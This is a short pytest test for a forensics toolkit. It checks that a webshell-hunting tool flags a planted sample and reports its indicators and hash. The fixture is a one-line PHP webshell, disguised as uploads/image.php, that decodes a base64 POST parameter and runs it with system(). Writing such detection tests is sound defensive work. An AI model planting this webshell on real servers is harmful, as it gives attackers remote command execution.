from dftk.catalog import load_builtin_tools
from dftk.core.registry import registry
from dftk.core.safety import SafetyPolicy


def test_webshell_hunt_finds_execution_input_and_obfuscation_chain(tmp_path):
    sample = tmp_path / "uploads" / "image.php"
    sample.parent.mkdir()
    sample.write_text("<?php $x = base64_decode($_POST['cmd']); system($x); ?>", encoding="utf-8")
    load_builtin_tools()
    observation = registry.run("web.webshell_hunt", {"root": str(tmp_path)}, SafetyPolicy())
    assert observation.status.value == "ok"
    assert observation.facts["lead_count"] == 1
    lead = observation.facts["leads"][0]
    assert lead["score"] >= 4
    assert {item["kind"] for item in lead["indicators"]} >= {"shell_execution", "obfuscation_decode", "request_parameter"}
    assert lead["sha256"]
